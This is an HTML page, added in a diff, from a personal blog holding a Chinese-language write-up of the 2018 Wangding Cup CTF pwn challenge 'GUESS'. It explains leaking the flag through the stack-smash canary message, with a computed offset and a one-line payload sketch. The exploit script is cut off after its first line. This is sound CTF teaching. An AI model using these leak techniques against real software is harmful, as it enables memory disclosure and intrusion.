@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>2018 网鼎杯-GUESS - xia0le&#39;s Blog</title><meta name="author" content="xia0le">
+<meta name="description" content="checksec 开了 canary，nx "><meta name="keywords" content='Binary, PWN'>
+  <meta itemprop="name" content="2018 网鼎杯-GUESS">
+  <meta itemprop="description" content="checksec 开了 canary，nx">
+  <meta itemprop="datePublished" content="2023-10-15T21:47:44+08:00">
+  <meta itemprop="dateModified" content="2023-10-15T21:47:44+08:00">
+  <meta itemprop="wordCount" content="277">
+  <meta itemprop="keywords" content="Binary,PWN"><meta property="og:url" content="http://localhost:1313/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/">
+  <meta property="og:site_name" content="xia0le&#39;s Blog">
+  <meta property="og:title" content="2018 网鼎杯-GUESS">
+  <meta property="og:description" content="checksec 开了 canary，nx">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-10-15T21:47:44+08:00">
+    <meta property="article:modified_time" content="2023-10-15T21:47:44+08:00">
+    <meta property="article:tag" content="Binary">
+    <meta property="article:tag" content="PWN">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="2018 网鼎杯-GUESS">
+  <meta name="twitter:description" content="checksec 开了 canary，nx">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/" title="2018 网鼎杯-GUESS - xia0le&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/about/" title="About" /><link rel="next" type="text/html" href="http://localhost:1313/posts/cactisql%E6%B3%A8%E5%85%A5-cve-2023-49085/" title="Cacti SQL注入 CVE-2023-49085" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "2018 网鼎杯-GUESS",
+    "inLanguage": "en-us",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess\/"
+    },"genre": "posts","keywords": "Binary, PWN","wordcount":  277 ,
+    "url": "http:\/\/localhost:1313\/posts\/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess\/","datePublished": "2023-10-15T21:47:44+08:00","dateModified": "2023-10-15T21:47:44+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "xia0le"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="xia0le&#39;s Blog"><span class="header-title-text">xia0le&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="xia0le&#39;s Blog"><span class="header-title-text">xia0le&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>2018 网鼎杯-GUESS</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      xia0le</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/ctf/" class="post-category" title="Category - CTF"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CTF</a></span></div><div class="post-meta-line"><span title="published on 2023-10-15 21:47:44"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2023-10-15">2023-10-15</time></span>&nbsp;<span title="277 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#checksec">checksec</a></li>
+    <li><a href="#开了-canarynx"><strong>开了 canary，nx</strong></a></li>
+    <li><a href="#主函数">主函数</a></li>
+    <li><a href="#分析">分析</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="checksec" class="heading-element"><span>checksec</span>
+  <a href="#checksec" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h2 id="开了-canarynx" class="heading-element"><span><strong>开了 canary，nx</strong></span>
+  <a href="#%e5%bc%80%e4%ba%86-canarynx" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><img loading="lazy" src="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629950550147-ff28e13e-7705-4952-baab-6afe4d5c5eef-20220825205211-txk1dyk.png" alt="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629950550147-ff28e13e-7705-4952-baab-6afe4d5c5eef-20220825205211-txk1dyk.png" srcset="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629950550147-ff28e13e-7705-4952-baab-6afe4d5c5eef-20220825205211-txk1dyk.png?size=small, /posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629950550147-ff28e13e-7705-4952-baab-6afe4d5c5eef-20220825205211-txk1dyk.png?size=medium 1.5x, /posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629950550147-ff28e13e-7705-4952-baab-6afe4d5c5eef-20220825205211-txk1dyk.png?size=large 2x" data-title="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629950550147-ff28e13e-7705-4952-baab-6afe4d5c5eef-20220825205211-txk1dyk.png" style="--width: 980px;--aspect-ratio: 980 / 277;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="主函数" class="heading-element"><span>主函数</span>
+  <a href="#%e4%b8%bb%e5%87%bd%e6%95%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><img loading="lazy" src="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629950520545-cae87c1e-b3e6-42b2-940c-77a9e4072e5e-20220825205211-5hs7e0e.png" alt="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629950520545-cae87c1e-b3e6-42b2-940c-77a9e4072e5e-20220825205211-5hs7e0e.png" srcset="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629950520545-cae87c1e-b3e6-42b2-940c-77a9e4072e5e-20220825205211-5hs7e0e.png?size=small, /posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629950520545-cae87c1e-b3e6-42b2-940c-77a9e4072e5e-20220825205211-5hs7e0e.png?size=medium 1.5x, /posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629950520545-cae87c1e-b3e6-42b2-940c-77a9e4072e5e-20220825205211-5hs7e0e.png?size=large 2x" data-title="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629950520545-cae87c1e-b3e6-42b2-940c-77a9e4072e5e-20220825205211-5hs7e0e.png" style="--width: 1149px;--aspect-ratio: 1149 / 844;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="分析" class="heading-element"><span>分析</span>
+  <a href="#%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><strong>gets可溢出，但有canary</strong></p>
+<p><strong>不能爆破（只有3次机会）</strong></p>
+<p><strong>可用SSP（stack smashes protect） leak canary</strong></p>
+<p><strong>程序检查canary如被修改则程序崩溃并且输出带有argv[0]（当前文件名）的信息</strong></p>
+<p><img loading="lazy" src="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629950838686-5398c674-d265-40ee-92e6-4fd4c91f3f03-20220825205211-5uow7yw.png" alt="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629950838686-5398c674-d265-40ee-92e6-4fd4c91f3f03-20220825205211-5uow7yw.png" srcset="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629950838686-5398c674-d265-40ee-92e6-4fd4c91f3f03-20220825205211-5uow7yw.png?size=small, /posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629950838686-5398c674-d265-40ee-92e6-4fd4c91f3f03-20220825205211-5uow7yw.png?size=medium 1.5x, /posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629950838686-5398c674-d265-40ee-92e6-4fd4c91f3f03-20220825205211-5uow7yw.png?size=large 2x" data-title="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629950838686-5398c674-d265-40ee-92e6-4fd4c91f3f03-20220825205211-5uow7yw.png" style="--width: 858px;--aspect-ratio: 858 / 189;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><strong>在程序加了canary保护之后，如果我们读取的buffer覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而stack smash技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序发现canary保护之后，如果发现canary被修改的话，程序就会执行__stack_chk_fail函数来打印argv[0]指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">__attribute__</span> <span class="p">((</span><span class="n">noreturn</span><span class="p">))</span> <span class="nf">__stack_chk_fail</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">__fortify_fail</span> <span class="p">(</span><span class="s">&#34;stack smashing detected&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">__attribute__</span> <span class="p">((</span><span class="n">noreturn</span><span class="p">))</span> <span class="n">internal_function</span> <span class="nf">__fortify_fail</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="cm">/* The loop is added only to keep gcc happy.  */</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__libc_message</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">&#34;*** %s ***: %s terminated</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">msg</span><span class="p">,</span> <span class="n">__libc_argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">?:</span> <span class="s">&#34;&lt;unknown&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="思路" class="heading-element"><span>思路</span>
+  <a href="#%e6%80%9d%e8%b7%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><ol>
+<li><strong>由于flag已经在stack上可考虑leak flag</strong></li>
+<li><strong>gdb计算输入的内容到argv[0]距离</strong></li>
+<li>**leak puts address -&gt; compute libc base **</li>
+<li><strong>compute environ address -&gt; 通过 environ leak stack address</strong></li>
+<li><strong>compute offset (stack addr and flag addr) -&gt; leak flag</strong></li>
+</ol>
+<p><strong>注：environ里存有stack地址</strong></p>
+<p><strong>gdb计算输入的内容到argv[0]距离</strong></p>
+<p><strong>在gets后下断点，也就是strcmp处</strong></p>
+<p><img loading="lazy" src="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629951543703-e4b76b7e-dfe6-49d4-8b2e-e4d8d0598518-20220825205212-zhhbd01.png" alt="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629951543703-e4b76b7e-dfe6-49d4-8b2e-e4d8d0598518-20220825205212-zhhbd01.png" srcset="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629951543703-e4b76b7e-dfe6-49d4-8b2e-e4d8d0598518-20220825205212-zhhbd01.png?size=small, /posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629951543703-e4b76b7e-dfe6-49d4-8b2e-e4d8d0598518-20220825205212-zhhbd01.png?size=medium 1.5x, /posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629951543703-e4b76b7e-dfe6-49d4-8b2e-e4d8d0598518-20220825205212-zhhbd01.png?size=large 2x" data-title="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629951543703-e4b76b7e-dfe6-49d4-8b2e-e4d8d0598518-20220825205212-zhhbd01.png" style="--width: 1217px;--aspect-ratio: 1217 / 248;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><strong>gdb下断点输入aaaa</strong></p>
+<p>**argv[0]地址： **0x7fffffffe4a8</p>
+<p><strong>输入的地址：0x7fffffffe380</strong></p>
+<p><strong>offset = 0x128</strong></p>
+<p><img loading="lazy" src="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629951688703-0c0c277a-b99f-4ccd-8daf-b24a80d1f017-20220825205212-siuc2cs.png" alt="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629951688703-0c0c277a-b99f-4ccd-8daf-b24a80d1f017-20220825205212-siuc2cs.png" srcset="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629951688703-0c0c277a-b99f-4ccd-8daf-b24a80d1f017-20220825205212-siuc2cs.png?size=small, /posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629951688703-0c0c277a-b99f-4ccd-8daf-b24a80d1f017-20220825205212-siuc2cs.png?size=medium 1.5x, /posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629951688703-0c0c277a-b99f-4ccd-8daf-b24a80d1f017-20220825205212-siuc2cs.png?size=large 2x" data-title="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629951688703-0c0c277a-b99f-4ccd-8daf-b24a80d1f017-20220825205212-siuc2cs.png" style="--width: 932px;--aspect-ratio: 932 / 595;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="构造payload" class="heading-element"><span>构造payload</span>
+  <a href="#%e6%9e%84%e9%80%a0payload" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><pre tabindex="0"><code>payload = &#39;a&#39;*0x128 + leak address</code></pre><p><strong>获取environ真实地址-&gt; 可leak stack 真实地址</strong></p>
+<p><strong>可见enviro真实地址不在栈上</strong></p>
+<p><strong>相同方法 environ addr -&gt; leak stack addr -&gt; compute offset (stack addr and flag addr) -&gt; leak flag</strong></p>
+<p><img loading="lazy" src="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629949875697-c9307b04-ac9c-47d7-ae1b-bdabeebc6285-20220825205212-srhuwgt.png" alt="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629949875697-c9307b04-ac9c-47d7-ae1b-bdabeebc6285-20220825205212-srhuwgt.png" srcset="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629949875697-c9307b04-ac9c-47d7-ae1b-bdabeebc6285-20220825205212-srhuwgt.png?size=small, /posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629949875697-c9307b04-ac9c-47d7-ae1b-bdabeebc6285-20220825205212-srhuwgt.png?size=medium 1.5x, /posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629949875697-c9307b04-ac9c-47d7-ae1b-bdabeebc6285-20220825205212-srhuwgt.png?size=large 2x" data-title="/posts/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-guess/images/net-img-1629949875697-c9307b04-ac9c-47d7-ae1b-bdabeebc6285-20220825205212-srhuwgt.png" style="--width: 1743px;--aspect-ratio: 1743 / 834;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="exp" class="heading-element"><span>exp</span>
+  <a href="#exp" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#encoding:utf-8</span>
